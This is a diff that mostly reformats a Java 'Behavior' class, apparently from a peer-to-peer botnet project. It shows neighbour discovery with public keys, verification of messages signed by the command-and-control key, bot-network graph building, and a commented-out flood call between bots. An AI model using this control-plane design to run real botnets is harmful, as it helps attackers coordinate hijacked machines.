@@ -89,27 +89,26 @@ public class Behavior {
 		List<Pairs<String, String>> response = null;
 		response = req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(), data);
 		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();
-		
+
 		if (response != null) {
 			response.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
 		} else
 			System.out.println("torno null");
-		
+
 		for (Pairs<String, String> pairs : response) {
-			Pairs<IP,PublicKey> in=new Pairs<IP,PublicKey>();
+			Pairs<IP, PublicKey> in = new Pairs<IP, PublicKey>();
 			in.setValue1(new IP(pairs.getValue1()));
 			in.setValue2(pki.rebuildPuK(pairs.getValue2()));
 			newNeighbours.add(in);
 		}
-		
+
 		if (newNeighbours != null) {
 			newNeighbours.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
 		} else
 			System.out.println("torno null");
-	
 
 		nServ.getNeighbours().setAll(newNeighbours);
-		
+
 	}
 
 	/**
@@ -192,7 +191,7 @@ public class Behavior {
 			// verifica la firma con chiave publica c&c
 			try {
 				System.out.println("signature" + msgs[2]);
-				System.out.println(" pk "+ pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
+				System.out.println(" pk " + pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
 				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
 						nServ.getCommandConquerIps().getList().get(0).getValue2())) {
 					Pairs<Integer, String> data = new Pairs<>();
@@ -222,14 +221,14 @@ public class Behavior {
 
 		System.out.println("size lista " + nServ.getNeighbours().getList().size());
 		for (Pairs<IP, PublicKey> p : nServ.getNeighbours().getList()) {
-			//IP test = p.getValue1();
-			Object x=p.getValue1();
+			// IP test = p.getValue1();
+			Object x = p.getValue1();
 			IP test = new IP(x.toString());
-			System.out.println("dsasaddavvvvvv "+test.getIp());			
-//			if (!ip.equals(test)) {
-//				req.sendFloodToOtherBot(p.getValue1(), msg);
-//				System.out.println("flood vicino "+ test);
-//			}
+			System.out.println("dsasaddavvvvvv " + test.getIp());
+			// if (!ip.equals(test)) {
+			// req.sendFloodToOtherBot(p.getValue1(), msg);
+			// System.out.println("flood vicino "+ test);
+			// }
 		}
 
 		// nServ.getNeighbours().getList().forEach((pairs) -> {
@@ -329,7 +328,7 @@ public class Behavior {
 		for (String str : graph) {
 			String[] sts = str.split("<HH>");
 			for (int i = 0; i < sts.length; i++) {
-				System.out.println("pasrse edge "+ sts[i] );
+				System.out.println("pasrse edge " + i + " " + sts[i]);
 			}
 			edge.add(new Pairs<IP, IP>(new IP(sts[0]), new IP(sts[1])));
 			if (!vertex.contains(new IP(sts[0])))
@@ -337,8 +336,8 @@ public class Behavior {
 			if (!vertex.contains(new IP(sts[1])))
 				vertex.add(new IP(sts[1]));
 		}
-		edge.forEach(e->System.out.println("edge "+e.getValue1() +" to "+ e.getValue2()));
-		vertex.forEach(v->System.out.println("vertex "+ v.getIp()));
+		edge.forEach(e -> System.out.println("edge " + e.getValue1() + " to " + e.getValue2()));
+		vertex.forEach(v -> System.out.println("vertex " + v.getIp()));
 		pServ.updateNetworkP2P(edge, vertex);
 		// avvisa cec che se ready
 		Boolean b = req.ready(ip);
